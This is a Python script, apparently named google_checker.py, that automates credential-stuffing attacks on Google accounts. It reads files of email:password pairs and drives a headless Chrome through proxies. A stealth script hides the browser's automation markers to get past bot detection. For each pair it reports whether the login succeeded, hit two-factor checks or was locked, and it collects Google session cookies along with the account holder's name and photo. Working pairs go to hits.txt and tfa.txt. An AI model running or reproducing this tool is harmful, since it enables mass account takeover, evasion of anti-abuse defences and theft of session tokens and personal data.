import sys
import asyncio
import re
import json
import shutil
import os
from pathlib import Path
#@Q_B_h tele
try:
    from playwright.async_api import async_playwright
except ImportError:
    try:
        sys.path.insert(0, "/tmp/pwlib")
        from playwright.async_api import async_playwright
    except ImportError:
        print("pip install playwright && playwright install chromium")
        sys.exit(1)


def find_chrome():
    for c in [
        shutil.which("chromium"),
        shutil.which("chromium-browser"),
        shutil.which("google-chrome"),
        shutil.which("google-chrome-stable"),
        "/home/runner/.nix-profile/bin/chromium",
        "/usr/bin/chromium",
        "/usr/bin/chromium-browser",
        "/usr/bin/google-chrome",
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        "/Applications/Chromium.app/Contents/MacOS/Chromium",
    ]:
        if c and Path(c).exists():
            return c
    return None


def parse_proxy(p):
    if not p:
        return None
    p = p.strip()
    if not p.startswith("http"):
        p = "http://" + p
    m = re.match(r"(https?://)([^@:]+):([^@]+)@(.+)", p)
    if m:
        scheme, user, pw, host = m.groups()
        return {"server": f"{scheme}{host}", "username": user, "password": pw}
    raw = p.replace("http://", "").replace("https://", "")
    parts = raw.split(":")
    if len(parts) == 4:
        return {"server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
    return {"server": p}


STEALTH = (
    "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"
    "window.chrome={runtime:{id:undefined,connect:()=>{},sendMessage:()=>{}},"
    "loadTimes:()=>{},csi:()=>{},app:{}};"
    "Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});"
    "['__playwright','_selenium','callSelenium','__webdriver_evaluate',"
    "'__selenium_evaluate','__driver_unwrapped'].forEach(k=>{try{delete window[k];}catch(e){}});"
)

WANT_COOKIES = {
    "SID", "SSID", "APISID", "SAPISID", "LSID", "HSID", "SIDCC",
    "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PAPISID",
    "__Secure-3PAPISID", "__Secure-1PSIDCC", "__Secure-3PSIDCC",
}


def extract_info(raw):
    info = {}
    m = re.search(r'"Aho3hb","(\[\[.*?\]\])"', raw)
    if m:
        try:
            inner = m.group(1).replace('\\"', '"').replace('\\\\', '\\')
            data = json.loads(inner)
            if data and data[0] and len(data[0]) >= 4:
                row = data[0]
                first   = (row[1] or "").strip()
                last    = (row[2] or "").strip()
                display = (row[3] or "").strip()
                if display:
                    info["name"] = display
                elif first or last:
                    info["name"] = f"{first} {last}".strip()
        except Exception:
            pass
    pics = re.findall(r'"(https://lh3\.googleusercontent\.com/a/[^"\\]+)"', raw)
    for pic in pics:
        if "default-user" not in pic:
            info["photo"] = pic
            break
    if "photo" not in info and pics:
        info["photo"] = pics[0].rstrip("\\")
    return info


async def _login(page, ctx, email, password):
    raw_parts = []

    async def on_resp(r):
        if "batchexecute" in r.url:
            try:
                raw_parts.append(await r.text())
            except Exception:
                pass

    ctx.on("response", on_resp)

    await page.goto(
        "https://accounts.google.com/v3/signin/identifier"
        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en",
        timeout=30000,
        wait_until="domcontentloaded",
    )

    if "/rejected" in page.url:
        return "error", {}, "IP blocked at login page"

    try:
        await page.wait_for_selector("#identifierId", timeout=10000)
    except Exception:
        return "error", {}, "email field not found"

    await page.fill("#identifierId", email)
    await page.click("#identifierNext")

    try:
        await page.wait_for_url(
            re.compile(r"(challenge|/pwd|rejected|deniedsigninrejected)"),
            timeout=9000,
        )
    except Exception:
        pass
    await page.wait_for_timeout(1500)

    url  = page.url
    html = await page.content()
    info = extract_info("\n".join(raw_parts))

    if any(s in html for s in [
        "couldn't find your Google Account",
        "Couldn&#39;t find your Google Account",
        "Find your email",
    ]):
        return "no_account", {}, ""

    if "/rejected" in url and 'type="password"' not in html:
        return "error", {}, "IP blocked after email step"

    if 'type="password"' not in html:
        if any(w in html.lower() for w in ["phone", "recovery", "verify it"]):
            return "2fa", info, ""
        if any(s in url for s in ["/challenge", "interstitial"]):
            return "2fa", info, ""
        return "error", {}, "password field not found"

    pwd_sel = None
    for sel in [
        "input[name='Passwd']:visible",
        "input[name='Passwd']",
        "input[type='password']:not([name='hiddenPassword']):visible",
        "input[type='password']:not([name='hiddenPassword'])",
        "input[type='password']:not([aria-hidden='true'])",
    ]:
        try:
            await page.wait_for_selector(sel, timeout=4000)
            pwd_sel = sel
            break
        except Exception:
            pass

    if not pwd_sel:
        return "error", {}, "password selector not found"

    await page.fill(pwd_sel, password)
    await page.click("#passwordNext")

    try:
        await page.wait_for_url(
            re.compile(r"(challenge|rejected|myaccount|mail\.google|AccountDisabled|/challenge)"),
            timeout=12000,
        )
    except Exception:
        pass
    await page.wait_for_timeout(1500)

    url  = page.url
    html = await page.content()

    if any(s in html for s in [
        "Wrong password", "wrong-password",
        "INCORRECT_ANSWER_ENTERED", "incorrectPasswordJumboError",
    ]):
        return "bad", {}, ""

    if "/rejected" in url and any(s in html for s in [
        "sign you in", "Couldn", "couldn't sign", "Unable to sign",
    ]):
        return "hit", info, "new device blocked by Google"

    if any(s in url for s in ["signin/challenge", "interstitial"]) or any(s in html for s in [
        "2-Step Verification", "Verify it's you", "Verify it&#39;s you",
        "phone number", "verification code", "recovery email",
        "unusual activity", "Help us keep your account safe",
    ]):
        return "2fa", info, ""

    if "AccountDisabled" in url or any(s in html.lower() for s in [
        "has been disabled", "account suspended", "this account has been",
    ]):
        return "locked", info, ""

    cks = await ctx.cookies()
    session = {
        c["name"]: c["value"]
        for c in cks
        if c["name"] in WANT_COOKIES and "google" in c.get("domain", "")
    }
    if session.get("SID") or session.get("__Secure-1PSID") or session.get("__Secure-3PSID"):
        return "hit", info, ""

    title = re.search(r"<title[^>]*>([^<]+)<", html)
    return "unknown", {}, (title.group(1).strip() if title else url[:80])


async def check_async(email, password, proxy=None):
    chrome = find_chrome()
    px     = parse_proxy(proxy)

    async with async_playwright() as pw:
        launch_args = [
            "--no-sandbox",
            "--disable-gpu",
            "--disable-dev-shm-usage",
            "--disable-blink-features=AutomationControlled",
            "--disable-http2",
            "--disable-quic",
            "--window-size=1280,800",
        ]
        kw = {"headless": True, "args": launch_args}
        if chrome:
            kw["executable_path"] = chrome
        if px:
            kw["proxy"] = px

        browser = await pw.chromium.launch(**kw)
        ctx = await browser.new_context(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/138.0.0.0 Safari/537.36"
            ),
            viewport={"width": 1280, "height": 800},
            locale="en-US",
            timezone_id="America/New_York",
            ignore_https_errors=True,
            extra_http_headers={"Accept-Language": "en-US,en;q=0.9"},
        )
        await ctx.add_init_script(STEALTH)
        page = await ctx.new_page()

        try:
            status, info, detail = await _login(page, ctx, email, password)
        except Exception as ex:
            status, info, detail = "error", {}, str(ex)

        try:
            await browser.close()
        except Exception:
            pass

        return status, info, detail


def check(email, password, proxy=None):
    return asyncio.run(check_async(email, password, proxy))


LABELS = {
    "hit":        "HIT",
    "2fa":        "2FA",
    "bad":        "BAD",
    "locked":     "LOCKED",
    "no_account": "NO_ACCOUNT",
    "error":      "ERROR",
    "unknown":    "UNKNOWN",
}

ICONS = {
    "hit": "✅", "2fa": "🔒", "bad": "❌",
    "locked": "🚫", "no_account": "👻", "error": "⚠️", "unknown": "❓",
}


def print_result(email, password, status, info, detail):
    icon  = ICONS.get(status, "?")
    label = LABELS.get(status, status.upper())
    line  = f"{icon} {label:<12} {email}:{password}"
    if info.get("name"):
        line += f"  |  {info['name']}"
    if info.get("photo"):
        line += f"\n   photo: {info['photo']}"
    if detail:
        line += f"\n   note:  {detail}"
    print(line)


def check_file(path, proxy=None):
    totals = {k: 0 for k in LABELS}
    hits, tfa = [], []

    with open(path, encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f if ":" in l.strip() and not l.startswith("#")]

    print(f"\n{len(lines)} accounts | proxy: {proxy or 'none'}\n" + "─" * 50)

    for line in lines:
        email, password = line.split(":", 1)
        email    = email.strip()
        password = password.strip()
        status, info, detail = check(email, password, proxy)
        print_result(email, password, status, info, detail)
        totals[status] = totals.get(status, 0) + 1
        entry = f"{email}:{password}"
        if info.get("name"):
            entry += f"  |  {info['name']}"
        if status == "hit":
            hits.append(entry)
        elif status == "2fa":
            tfa.append(entry)

    if hits:
        Path("hits.txt").write_text("\n".join(hits))
    if tfa:
        Path("tfa.txt").write_text("\n".join(tfa))

    print("\n" + "─" * 50)
    for k, v in totals.items():
        if v:
            print(f"  {ICONS.get(k,'')} {LABELS.get(k,k):<12} {v}")
    if hits:
        print("\n  hits.txt saved")
    if tfa:
        print("  tfa.txt saved")


def usage():
    print(
        "\nUsage:\n"
        "  python3 google_checker.py email pass\n"
        "  python3 google_checker.py email pass proxy\n"
        "  python3 google_checker.py accounts.txt\n"
        "  python3 google_checker.py accounts.txt proxy\n\n"
        "Proxy formats:\n"
        "  host:port:user:pass\n"
        "  user:pass@host:port\n"
        "  http://user:pass@host:port\n\n"
        "Install:\n"
        "  pip install playwright\n"
        "  playwright install chromium\n"
    )


if __name__ == "__main__":
    args = sys.argv[1:]

    if not args:
        usage()
        sys.exit(0)

    if os.path.isfile(args[0]):
        proxy = args[1] if len(args) > 1 else None
        check_file(args[0], proxy)
    elif len(args) >= 2:
        email    = args[0]
        password = args[1]
        proxy    = args[2] if len(args) > 2 else None
        status, info, detail = check(email, password, proxy)
        print_result(email, password, status, info, detail)
    else:
        usage()
        sys.exit(1)
